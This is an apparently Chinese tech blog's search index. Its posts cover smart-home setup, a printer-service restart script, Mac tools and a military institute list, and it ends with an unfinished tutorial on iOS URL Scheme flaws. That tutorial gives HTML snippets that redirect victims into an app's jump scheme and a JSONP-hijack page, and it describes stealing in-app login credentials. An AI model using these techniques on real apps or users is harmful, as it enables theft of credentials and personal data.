[{"categories":["智能家居"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # Homekit 家居改造计划 当前版本：1.0 这个智能家居改造计划早在2017年装修的时候就有考虑了，最早只是买了小米的空调伴侣2，实现用手机控制空调，但是它并不支持HomeKit，所以没办法用 Siri 进行语音控制，后来有考虑过买米家的配件然后配合树莓派的 Home Assistant，但这个方案因为网关的问题也就被废弃了。 今年暑假了解到了绿米 Aqara 的解决方案，于是先把空调伴侣换成了 Aqara 的试用了一段时间。 前段时间因为家里的老音响彻底报废了，换上了一个 HomePod，于是智能家居的改造计划正式开始了。 终于在10月31日，我把灯控的开关换成智能开关，实现了 Siri 对电灯的控制。 家庭 ","date":"2022-01-15","objectID":"/zh-cn/15-1/:0:0","tags":["智能家居"],"title":"Homekit 家居改造计划","uri":"/zh-cn/15-1/"},{"categories":["智能家居"],"content":"配置方案 设备 用途 HomePod 家庭中枢 绿米Aqara 墙壁开关D1(ZigBee单火三键版) 客厅开关 绿米Aqara 墙壁开关D1(ZigBee单火单键版) 房间开关 绿米Aqara 空调伴侣P3 空调控制、网关 捷径 快捷指令 配置方案 空调伴侣会送温度和湿度传感器，房间里找个不显眼的地方贴上就行。 值得注意的是，在购买开关前需要确认原来的开关布线方式，如果没有零线，则应该买单火线版本，当时因为对家里的开关太过信任，买了两个零火线版本，后来才发现买错了… 因为是 ZigBee 协议，所以智能开关并不需要连接 Wi-Fi，不会干扰本地设备。 ","date":"2022-01-15","objectID":"/zh-cn/15-1/:1:0","tags":["智能家居"],"title":"Homekit 家居改造计划","uri":"/zh-cn/15-1/"},{"categories":["智能家居"],"content":"改造过程 更换开关的过程涉及强电，建议寻找专业人士进行操作。 单火单键 单火三键 火线接好，打开电闸，按照说明书进行匹配即可，设备会自动从 Aqara 的管理程序中同步到「家庭」。 ","date":"2022-01-15","objectID":"/zh-cn/15-1/:2:0","tags":["智能家居"],"title":"Homekit 家居改造计划","uri":"/zh-cn/15-1/"},{"categories":["智能家居"],"content":"家庭控制 可以直接使用「家庭」或者 Aqara 的程序对开关进行控制 家庭控制 也可以召唤任意一台设备的 Siri，开或关某个房间的什么灯。 在客厅的时候还能使用 HomePod 的 Siri 进行控制，就是识别的不太准，希望苹果能继续调教调教 Siri。 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2022-01-15","objectID":"/zh-cn/15-1/:3:0","tags":["智能家居"],"title":"Homekit 家居改造计划","uri":"/zh-cn/15-1/"},{"categories":["Windows"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # Windows 强制刷新打印机状态 打印机卡纸 五月份返校之后在宿舍办了个打印店，因为打印的东西比较多，偶尔打印机会假卡纸。 Windows 直接就拉闸了根本没法打印，宿舍三台 PC 都没办法操作，只有我的 Mac 能让他继续印。那么解决问题的思路就是要刷新 Windows 下打印机的状态。 在网上逛了一圈，找到了个重启进程的方法，经过我的一波调试，发现要重启两个进程，即 Spooler 和 PrintNotify。 下面给出批处理脚本的代码 @echo off echo 修复尼玛打印机卡纸 echo 请在使用前确定自己用的管理员权限运行的这个脚本 echo by 0xJacky @pause net.exe session 1\u003eNUL 2\u003eNUL \u0026\u0026 ( goto is_admin ) || ( goto not_admin ) :is_admin echo 正在停止相关服务 sc stop Spooler sc stop PrintNotify echo 正在启动相关服务 sc start Spooler sc start PrintNotify echo 应该修好了 goto end :not_admin echo 请用管理员权限运行这个脚本 :end pause 以管理员权限运行即可刷新 Windows 下打印机的状态。 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2022-01-15","objectID":"/zh-cn/15/:0:0","tags":["Windows"],"title":"Windows 强制刷新打印机状态","uri":"/zh-cn/15/"},{"categories":["测试"],"content":" *{ border: 0; margin: 0; padding: 0; outline: none; box-sizing: border-box; } #body { background: #000; width: 100vw; height: 100vh; overflow: hidden; display: flex; flex-direction: column; align-items: center; } #ybrc { height: calc(100vh - 60px); display: flex; justify-content: center; align-items: center; } #player { width: 100%; height: auto; max-height: 100%; } #buttons { height: 60px; padding: 10px; text-align: center; } #switch, #next { background: #FFF; background: linear-gradient(to bottom, #FF2,#FB0); color: #AF2E08; font-size: 16px; font-weight: bold; height: 40px; padding: 0px 20px; margin: 0px 5px; border-radius: 20px; } 🚩提神: 开🥰 👉🏻播放下一个😍 (function (window, document) { if (top != self) { window.top.location.replace(self.location.href); } var get = function (id) { return document.getElementById(id); } var bind = function (element, event, callback) { return element.addEventListener(event, callback); } var auto = true; var player = get('player'); var randomm = function () { player.src = 'https://v.nrzj.vip/video.php/video.php?_t=' + Math.random(); player.play(); } bind(get('next'), 'click', randomm); bind(player, 'error', function () { randomm(); }); bind(get('switch'), 'click', function () { auto = !auto; this.innerText = '🚩提神: ' + (auto ? '开🥰' : '关😔'); }); bind(player, 'ended', function () { if (auto) randomm(); }); })(window, document); 扫一扫手机👀 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2022-01-11","objectID":"/zh-cn/%E9%9A%8F%E6%9C%BA%E8%A7%82%E7%9C%8B%E5%B0%8F%E5%A7%90%E5%A7%90%E8%A7%86%E9%A2%91_%E7%BD%91%E9%A1%B5%E7%89%88/:0:0","tags":["测试"],"title":"随机观看小姐姐视频_网页在线版","uri":"/zh-cn/%E9%9A%8F%E6%9C%BA%E8%A7%82%E7%9C%8B%E5%B0%8F%E5%A7%90%E5%A7%90%E8%A7%86%E9%A2%91_%E7%BD%91%E9%A1%B5%E7%89%88/"},{"categories":["Mac"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # mac下一款能够实时显示键盘按键软件 今天给大家介绍一款在电脑屏幕事实显示键盘操作的软件——**keycastr**，这款软件可以说是一款**录屏的利器**。 当你在录屏的过程中使用了键盘，无论是使用输入法输入内容，还是使用了快捷键，它都会在屏幕上实时显示当前按下的按键。 首次运行 keycastr，它默认会在屏幕的左下角显示键盘操作，如果你想更改键盘操作显示的位置，将鼠标移动到实时显示的键盘操作上方，直接拖拽到自己想要的位置即可。 这款软件的设置面板也非常简单，Display KeyCastr icon 可设置在哪显示软件图标，默认是在屏幕顶部的菜单栏和底部的 Dock 栏，都会显示软件图标。 设置面板的第二个选项卡 Display，则可以调整：在屏幕上显示的字体大小、一行可显示的文本长度、上一个文本消失所用的时间、设置背景色和文本的颜色。 在使用输入法输入文本的时候，如果同时开启了这个软件，在你噼里啪啦、尽情码字的同时，它会在屏幕上显示一长串的字母，有点会分散我们的注意力。 对于这个问题，你可以右击菜单栏的软件图标，选择 Stop Casting，暂时停用这个软件。 keycastr 下载地址： 如果你无法打开 GitHub 下载这款软件，可以点击下方的卡片，在后台回复「屏幕快捷键」，即可获取软件的安装包。 这款软件目前仅支持苹果的 macOS 系统，使用 Windows 系统的朋友，如果想在录屏的时候实现类似的效果，可以使用另外一款软件——Carnac。 Windows：Carnac MacOS：KeyCastr Linux：Screenkey 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2022-01-10","objectID":"/zh-cn/mac%E4%B8%8B%E4%B8%80%E6%AC%BE%E8%83%BD%E5%A4%9F%E5%AE%9E%E6%97%B6%E6%98%BE%E7%A4%BA%E9%94%AE%E7%9B%98%E6%8C%89%E9%94%AE%E8%BD%AF%E4%BB%B6/:0:0","tags":["Mac"],"title":"Mac下一款能够实时显示键盘按键软件","uri":"/zh-cn/mac%E4%B8%8B%E4%B8%80%E6%AC%BE%E8%83%BD%E5%A4%9F%E5%AE%9E%E6%97%B6%E6%98%BE%E7%A4%BA%E9%94%AE%E7%9B%98%E6%8C%89%E9%94%AE%E8%BD%AF%E4%BB%B6/"},{"categories":["MacOS","iterm2"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 如何让iterm2 在任何界面呼入呼出？ 第一步： preference -\u003e keys -\u003eCreate a Dedicated Hotkey Window 第二步： 设置Hotkey，根据个人喜好来设置（参考：command + space或command + /）； 勾选Floating Window 第三步： 重启 iterm2即可，现在你可以在任意界面，按快捷键呼出iterm，再次按即消失。 若没生效，看第四步； 第四步： preference -\u003e profiles -\u003e Window-\u003espace，设置为All Spaces。restart即可。 在Preference-\u003eProfiles-\u003eWindow界面，有一个Setting for New Windows的设置，可以对打开的新窗口进行窗口位置，窗口大小等设置。 效果如下： 要在其他全屏应用里（比如全屏的 chrome 页面）呼出，需要设置 space 为 all spaces 。 记得修改后需要重启 iterm。 ","date":"2022-01-09","objectID":"/zh-cn/9-1/:0:0","tags":["MacOS","iterm2"],"title":"如何让iterm2 在任何界面呼入呼出？","uri":"/zh-cn/9-1/"},{"categories":["MacOS","iterm2"],"content":"全屏 Profiles\u003eDefault\u003eWindow\u003eSettings for New Windows\u003eStyle\u003eMaximized（选择这个即可） 透明 Profiles\u003eDefault\u003eWindow\u003eWindow Appearance\u003eTransparentcy （根据 全屏 Profiles\u003eDefault\u003eWindow\u003eSettings for New Windows\u003eStyle\u003eMaximized（选择这个即可） 透明 Profiles\u003eDefault\u003eWindow\u003eWindow Appearance\u003eTransparentcy （根据自己的需求调节即可） 快捷键呼出/隐藏 Keys\u003eHotkey\u003eHotkey\u003e（输入自己的快捷键） 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2022-01-09","objectID":"/zh-cn/9-1/:0:1","tags":["MacOS","iterm2"],"title":"如何让iterm2 在任何界面呼入呼出？","uri":"/zh-cn/9-1/"},{"categories":["军工研究"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); ## 中国军工研究所分布速查 中国的军工企业一般都有代号，全称为国营 XXX 厂，而不是一些广告所称的中国人民解放军第 XXX 厂，他们的归口管理部门为国防科工委，而不受军队领导。 **七、八十年代政府中几个部门：核工业部、航天工业部、兵器工业部等，也曾经叫过五机部、七机部等，**这就是中国现在十大军工集团公司的前身。 后来在改革开放的过程中为了转变政府职能，把这些部门改为公司，即：中国核工业总公司、中国航天工业总公司、中国航空工业总公司、中国船舶工业总公司、中国兵器工业总公司，这就是原来的五大军工集团。 1997年为了引入内部竞争机制，这五大军工集团均一分为二，形成了军工十大集团公司（南北船已经开始合并工作）。 中国航天科技集团 **航天二院：**对外称防御技术研究院/长峰机电技术研究设计院。北京。 **航天三院：**对外称飞航技术研究院/海鹰机电技术研究设计院。北京。（含1964年成立第七机械工业部时从兵器部划归的558厂。） **航天六院：**对外称固体火箭发动机研究院/河西化工机械公司。呼和浩特。 **航天七院：**对外称建筑设计研究院。北京 **061基地：**对外称江南航天集团。遵义。 **066基地：**对外称三江航天集团。远安-孝感。 以上为六大院 军事基地 **011基地：**安顺。 **012基地：**汉中。预计建设成歼击机生产基地，1975年，中央决定西安飞机设计所研制的运八飞机由012基地继续研制，基地变为运输机制造基地。012飞机设计所分出单独设立陕西飞机制造公司，012基地成了航空配件生产基地。1980年，运八飞机投入批量生产。 **013基地（湖南航空）：**长沙。管辖几个航空配件厂和张家界航空工业职业技术学院、航空第三设计院。 **014基地（中国空军导弹研究院）：**洛阳。 **061基地（江南航天）：**遵义。 **062基地（航天七院）：**万源—成都。 **063基地（航天四院）：**西安。 **064基地（并入062基地）：**达州。 **066基地（三江航天）：**远安—孝感。 **067基地（航天六院）：**凤县—西安。 **068基地（湖南航天）：**武冈—长沙。 **081基地（川北电子）：**广元。原0821指挥部，1965年开始兴建，为火控雷达生产基地。 **083基地（振华电子）：**都匀。 中国航空研究机构（中国航空研究院） **301所：**中国航空综合技术研究所（北京） **303所：**中国航空精密机械技术研究所（北京） **304所：**中国航空计量技术研究所（北京） **601所：**沈阳飞机设计研究所 **602所：**中国直升机设计研究所（景德镇） **603所：**中航第一飞机研究院，原西安飞机研究所（西安） **605所：**中国特种飞行器研究所（荆门） **606所：**沈阳航空发动机研究所 **607所：**中航雷达与电子设备研究院（原雷华电子技术研究所内江607所与苏州长风有限责任公司171厂合并成立）苏州。 **608所：**株洲航空动力机械研究所 **609所：**中国航空附件研究所（襄樊） **610所：**中国航空救生研究所（襄樊） **611所：**成都飞机设计研究所 **612所：**014基地，中国空空导弹研究院（洛阳） **613所：**洛阳电光设备研究所 **614所：**中国航空动力控制系统研究所（无锡） **615所：**中国航空无线电电子研究所（上海） **618所：**西安飞行自动控制研究所 **620所：**中国航空系统工程研究所（北京） **621所：**北京航空材料研究院 **622所：**北京航空工艺研究所 **623所：**中国飞机强度研究所（西安） **624所：**中国燃气涡轮研究院（绵阳） **625所：**中国航空工业制造工程研究所（北京） **626所：**沈阳空气动力研究所（并入中国空气动力研究院） **627所：**哈尔滨空气动力研究所（与627所合并成立中国空气动力研究院） **628所：**中国航空信息中心（北京） **629所：**结构热强度研究所（长安） **630所：**中国飞行试验研究院（西安） **631所：**中国航空计算技术研究所（西安） **633所：**上海航空测控技术研究所 **634所：**北京长城航空测控技术研究所 **637所：**济南特种结构研究所 **640所：**上海飞机研究所（并入中航第一飞机研究院） **648所：**贵州飞机设计所 **649所：**贵州航空发动机设计所 **650所：**南昌飞机设计研究所 中国航天研究机构 11所 陕西动力机械设计研究所（六院）/北京航天动力研究所（一院） 12所 北京航天自动控制研究所（一院） 13所 北京控制仪器研究所（十院） 14所 北京特殊机电研究所（一院） 15所 北京特种工程机械研究所（一院） 16所 西安（六院） 17所 北京控制与电子技术研究所(一院) 18所 北京精密机电控制设备研究所（一院） 19所 北京航天信息情报研究所（一院） 101所 北京航天试验技术研究所（一院） 102所 北京航天计量测试技术研究所（一院） 165所 陕西动力试验技术研究所（六院） 23所 北京无线电测量研究所（二院） 25所 北京遥感设备研究所（二院） 203所 北京无线电计量测试研究所（二院） 204所 北京计算机应用和仿真技术研究所（二院） 206所 北京机械设备研究所（二院） 207所 北京环境特性研究所（二院） 208所 北京电子文献服务中心（二院） 210所 西安长峰机电研究所（二院） 31所 北京动力机械研究所（三院） 33所 北京自动化控制设备研究所（三院） 35所 北京华航无线电测量研究所（三院） 303所 北京振兴计量测试研究所（三院） 304所 北京京航计算通讯研究所（三院） 306所 北京特种材料及应用研究所（三院） 310所 北京海鹰科技情报研究所（三院） 41所 陕西动力机械研究所（四院） 42所 湖北红星化学研究所。襄樊（四院） 43所 西安航天复合材料研究所（四院） 44所 陕西电器研究所（四院） 46所 内蒙古合成化工研究所（六院） 47所 陕西向阳化工机械公司科技信息研究所。蓝田（四院） 401所 西安航天动力测控技术研究所（四院） 501所 空间飞行器总体 502所 北京控制工程研究所（五院） 503所 北京卫星信息工程研究所（五院） 504所 西安空间无线电技术研究所（五院） 508所 北京空间机电研究所（五院） 509所 上海卫星工程研究所（五院） 510所 兰州物理研究所（五院） 511所 北京卫星环境工程研究所（五院） 512所 北京空间科技信息研究所（五院） 513所 山东航天电子技术研究所（五院） 514所 北京东方计量测试研究所（五院） 515所 汕头电子技术研究所（五院） 518所 山西航天机电设备研究所（五院） 529厂 北京卫星制造厂（五院） 539厂 上海科学仪器厂（五院） 601所 内蒙动力机械测试所（六院） 701所 北京空气动力研究所（直属） 702所 北京环境强度研究所（一院） 703所 北京航天材料与工艺研究所（一院） 704所 北京遥测技术研究所（十院） 706所 北京计算机技术及应用研究所（二院） 707所 航天科技情报研究所 708所 中国航天标准化研究所 710所 北京信息与控制研究所 771所 西安微电子技术研究所（九院） 772所 北京微电子技术研究所（九院） 801所 （八院） 802所 上海无线电设备研究所（八院） 803所 （八院） 804所 上海航天电子通讯设备研究所（八院） 807所 （八院） 808所 上海精密计量测试研究所（八院） 811所（八院） 812所（八院） 813所（八院） 814所新光电讯厂（八院） 中国兵器研究机构（中国兵器科学研究院） 52所 内蒙金属材料研究所（包头） 53所 山东非金属材料研究所（济南） 55所 长春设备工艺研究所 58所 西南自动化研究所（绵阳） 59所 西南技术工程研究所（重庆） 70所 山西车用发动机研究所（大同） 201所 中国北方车辆研究所（北京） 202所 西北机电工程研究所（西","date":"2022-01-09","objectID":"/zh-cn/9/:0:0","tags":["军工研究"],"title":"中国军工研究所分布速查","uri":"/zh-cn/9/"},{"categories":["漏洞","iOS"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # iOS URL Schemes与漏洞的碰撞组合 前言 iOS URL Schemes，这个单词对于大多数人来说可能有些陌生，但是类似下面这张图的提示大部分人应该都经常看见： 今天要探究的就是：了解iOS URL Schemes、如何发现iOS URL Schemes、iOS URL Schemes结合漏洞案例。 iOS URL Schemes ","date":"2022-01-08","objectID":"/zh-cn/8/:0:0","tags":["漏洞","iOS"],"title":"iOS URL Schemes与漏洞的碰撞组合","uri":"/zh-cn/8/"},{"categories":["漏洞","iOS"],"content":"基本概念 抛开iOS从URL Schemes的字面意思理解，就是地址协议（Scheme一般用来表示协议，比如 http、https、ftp 等），我们所熟知的HTTP协议的URL格式就是： http(s)://user:pass@host:port/path?query 举个例子：http://gh0st.cn/，在浏览器输入这个地址，浏览器是使用HTTP协议向 gh0st.cn 请求，请求的资源就是 / 。 再来看一下iOS URL Schemes的一个例子：weixin://，你在Safari浏览器(Mobile)输入这个网址就会提示你 在\"微信\"中打开链接吗？，然后由你选择”取消”或”打开”；和HTTP协议格式的URL访问流程进行对比，iOS URL Schemes 实际上就是启动一个应用的 URL，其访问流程是这样的： 浏览器输入\"weixin://\" -\u003e iOS识别URL Schemes -\u003e询问是否跳转到微信 -\u003e 确认跳转 -\u003e 从浏览器跳转到微信端 那么问题就来了，以上所述流程中的”iOS识别URL Schemes“，iOS如何识别这段URL Schemes？iOS官方要求的是APP开发者需要自己定义自己APP的”URL Schemes”，只有APP本身定义(支持)了URL Schemes，iOS才会去识别然后跳转。 ","date":"2022-01-08","objectID":"/zh-cn/8/:1:0","tags":["漏洞","iOS"],"title":"iOS URL Schemes与漏洞的碰撞组合","uri":"/zh-cn/8/"},{"categories":["漏洞","iOS"],"content":"定义 一个完整的 URL Schemes 应该分为 Scheme、Action、Parameter、Value 这 4 个部分，中间用冒号 :、斜线 /、问号 ?、等号 = 相连接。 举个例子：mst://jump?url=https://gh0st.cn/\u0026title=test，它对应的4部分就是如下所示： Scheme（头）: mst、Action（动作）: jump、Parameter（参数）: url、title、Value（值）: https://gh0st.cn、test 不同的部分之间有符号相连，它们也有一定的规则(和URL部分规则是一样的)： 冒号:：在链接头和命令之间； 双斜杠 //：在链接头和命令之间，有时会是三斜杠 ///； 问号 ?：在命令和参数之间； 等号 =：在参数和值之间； 和符号 \u0026：在一组参数和另一组参数之间。 ","date":"2022-01-08","objectID":"/zh-cn/8/:2:0","tags":["漏洞","iOS"],"title":"iOS URL Schemes与漏洞的碰撞组合","uri":"/zh-cn/8/"},{"categories":["漏洞","iOS"],"content":"理解 以上述所举的例子：mst://jump?url=https://gh0st.cn/\u0026title=test，来简单的说明下这段URL Scheme所产生的效果： 1.跳转到”mst”所对应的APP 2.在APP中执行jump动作（跳转网站） 3.告诉APPjump动作所需的url和title参数，对应的值分别为https://gh0st.cn/和test 可以理解为在APP应用中访问https://gh0st.cn/，网页标题为test。 寻找iOS APP的URL Schemes 当你学会了如何寻找APP的URL Schemes，你就算发现了半个漏洞。 ","date":"2022-01-08","objectID":"/zh-cn/8/:2:1","tags":["漏洞","iOS"],"title":"iOS URL Schemes与漏洞的碰撞组合","uri":"/zh-cn/8/"},{"categories":["漏洞","iOS"],"content":"获取IPA包 基本的URL Schemes可以在iOS APP中的Info.plist文件中寻找到，而一般你是无法获取到APP的ipa包的，所以需要借助软件获取到这个包。 前提是你需要这两台设备：MacBook、iPhone，如果你只拥有一台iPhone的话也有办法去获取（需要Thor APP，具体方法自行寻找）。 Mac上先安装Apple Configurator 2，然后你需要在该软件中登录你的Apple账户： 使用iPhone充电线将手机连接Mac，这时候软件中就会显示已经连接Mac的设备： 假设你需要获取微信的URL Schemes，那么你的手机已经安装过了微信，然后使用该软件进行添加，选中设备点击添加按钮，选择应用： 搜索微信，选中添加： 当你下载完成看见如下提示的时候，在Finder中按快捷键Command+Shift+G，输入~/资源库/Group Containers/K36BKF7T3D.group.com.apple.configurator/Library/Caches/Assets/TemporaryItems/MobileApps/ 软件下载的微信ipa文件就存在该文件夹中： 进入文件夹将ipa文件复制到其他地方： 然后回到Apple Configurator 2的提示，点击停止即可。 ","date":"2022-01-08","objectID":"/zh-cn/8/:3:0","tags":["漏洞","iOS"],"title":"iOS URL Schemes与漏洞的碰撞组合","uri":"/zh-cn/8/"},{"categories":["漏洞","iOS"],"content":"获取基本URL Schemes 将IPA包后缀名修改为ZIP，然后解压，进入Payload目录会看见一个.APP后缀名文件，选中文件右击显示包内容： 找到Info.plist文件并打开，搜索关键词URLSchemes： 被String标签所包含的就是微信的URL Schemes： \u003cstring\u003ewexinVideoAPI\u003c/string\u003e \u003cstring\u003eweixin\u003c/string\u003e \u003cstring\u003eweixinapp\u003c/string\u003e \u003cstring\u003efb290293790992170\u003c/string\u003e \u003cstring\u003ewechat\u003c/string\u003e \u003cstring\u003eQQ41C152CF\u003c/string\u003e \u003cstring\u003eprefs\u003c/string\u003e ","date":"2022-01-08","objectID":"/zh-cn/8/:4:0","tags":["漏洞","iOS"],"title":"iOS URL Schemes与漏洞的碰撞组合","uri":"/zh-cn/8/"},{"categories":["漏洞","iOS"],"content":"寻找完整URL Schemes 如上已经了解了如何获取最基本的URL Schemes，但是这远远不够，因为完整的URL Schemes有4部分，而目前只找到了第一部分，仅仅能做到的功能就是启动，而想找到更多的非基本URL Schemes需要其他的方法。有很多方法在这里不一一例举了，只例几个常见的思路供你参考。 ","date":"2022-01-08","objectID":"/zh-cn/8/:4:1","tags":["漏洞","iOS"],"title":"iOS URL Schemes与漏洞的碰撞组合","uri":"/zh-cn/8/"},{"categories":["漏洞","iOS"],"content":"从手机站点页面获取 一般网站都会有这些子域名：m\\h5\\mobile… 打开这些子域名，利用Chrome的开发者工具(F12)切换为手机模式视图，这样就能模拟手机去访问了： 那在这里可以在该页面的HTML代码中寻找URL Schemes（前提是你已经知道了基本的URL Schemes） 在这里我从页面的JavaScript代码中发现了很多URL Schemes： 有些还有参数，可以根据命名来猜这些URL Schemes的含义，例如path: \"mst://jump/core/web/jump\"，就可以知道这个是做Web跳转的，那跳转到哪个地址是什么参数控制呢？下面也有对应的告诉我们是url参数去控制，也就组成了这样一个URL Scheme: mst://jump/core/web/jump?url=https://gh0st.cn ","date":"2022-01-08","objectID":"/zh-cn/8/:4:2","tags":["漏洞","iOS"],"title":"iOS URL Schemes与漏洞的碰撞组合","uri":"/zh-cn/8/"},{"categories":["漏洞","iOS"],"content":"QRLCode解析地址获取 现在很多网站都支持二维码登录，就比如如下这个网站： 保存该二维码进行二维码解析： 解析得出这是一个URL Scheme，修改json参数url的值为我的网站尝试在浏览器中打开成功的触发了跳转APP，并且在APP中访问了我的网站。 ","date":"2022-01-08","objectID":"/zh-cn/8/:4:3","tags":["漏洞","iOS"],"title":"iOS URL Schemes与漏洞的碰撞组合","uri":"/zh-cn/8/"},{"categories":["漏洞","iOS"],"content":"逆向APP 不仅是iOS，安卓也支持URL Schemes，而一般的定义是一样的，所以你可以基于获取基本URL Schemes这个步骤将.APP文件的后缀去掉，这时候这个文件就变成了一个文件夹拖到Sublime里面全局搜索”weixin://“即可。 至于安卓的APK的逆向可以参考我之前的一篇文章\u003c 打造Mac下APK逆向环境到实战接口XSS挖掘 \u003e，可以在源代码中、所有文件内容中搜索URL Schemes。 漏洞案例 ","date":"2022-01-08","objectID":"/zh-cn/8/:4:4","tags":["漏洞","iOS"],"title":"iOS URL Schemes与漏洞的碰撞组合","uri":"/zh-cn/8/"},{"categories":["漏洞","iOS"],"content":"APP内URL跳转问题 其实严格来讲这不算是漏洞，毕竟利用有限，但又和一切能产生危害的问题都算漏洞这句话所冲突，所以在这还是选择列了出来，至于厂商觉不觉得是个安全性问题，还要看他们对“安全风险“的定义。 如何发现这类问题？在上文中我提到了如何发现URL Schemes，只要你发现了这种类型的URL Schemes就可以尝试替换地址为你的地址然后使用浏览器打开查看是否能在APP内跳转到你的地址，当然利用方式也很简单，构建一个HTML页面即可，然后将网址发送给“受害者”即可： \u003cscript\u003e window.location='URL Schemes'; \u003c/script\u003e ","date":"2022-01-08","objectID":"/zh-cn/8/:5:0","tags":["漏洞","iOS"],"title":"iOS URL Schemes与漏洞的碰撞组合","uri":"/zh-cn/8/"},{"categories":["漏洞","iOS"],"content":"凭证窃取（设计不当） 在做一次漏洞挖掘的时候也碰见了很多次这种问题，大概的描述下就是我找到了能在APP中打开网页的入口方式（例如：二维码扫描、URL Schemes动作），让APP访问到我的地址，这样我就可以直接获取到APP中登录后的凭证信息。 利用方式和URL跳转的方式是一样的；关于这方面漏洞产生原理得出一个可能“不太严谨的结论”：APP在做HTTP请求的时候默认所有访问的都是信任域，所以带上了本身已经登录的凭证去请求了。 ","date":"2022-01-08","objectID":"/zh-cn/8/:6:0","tags":["漏洞","iOS"],"title":"iOS URL Schemes与漏洞的碰撞组合","uri":"/zh-cn/8/"},{"categories":["漏洞","iOS"],"content":"结合漏洞扩大攻击面 在一次APP的漏洞挖掘中发现了一个JSONP劫持的问题，但是在这里只会对APP用户产生影响，在没有二维码扫描的情况下就需要结合URL Schemes来扩大这个漏洞的影响面，而不是局限于self。 利用流程： 用户打开https://gh0st.cn/test.html，test.html内容： \u003cscript\u003e window.location='mst://jump?url=https://gh0st.cn/jsonp.html'; \u003c/script\u003e 用户点开之后启动mst应用执行jump动作，跳转到https://gh0st.cn/jsonp.html，jsonp.html内容： \u003cscript\u003efunction test(data){ document.write(JSON.stringify(data)) }\u003c/script\u003e \u003cscript src=\"JSONP URL\"\u003e\u003c/script\u003e ","date":"2022-01-08","objectID":"/zh-cn/8/:6:1","tags":["漏洞","iOS"],"title":"iOS URL Schemes与漏洞的碰撞组合","uri":"/zh-cn/8/"},{"categories":["漏洞","iOS"],"content":"URL Schemes劫持 